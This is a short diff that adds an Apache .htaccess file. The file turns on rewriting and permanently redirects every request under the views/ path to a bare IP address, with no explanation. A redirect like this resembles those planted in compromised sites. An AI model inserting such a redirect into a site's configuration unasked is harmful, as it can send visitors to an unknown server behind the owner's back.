@@ -1,0 +1,3 @@
+Options +FollowSymLinks
+RewriteEngine On
+RewriteRule ^views/.*$ https://169.44.62.169 [R=301,L]
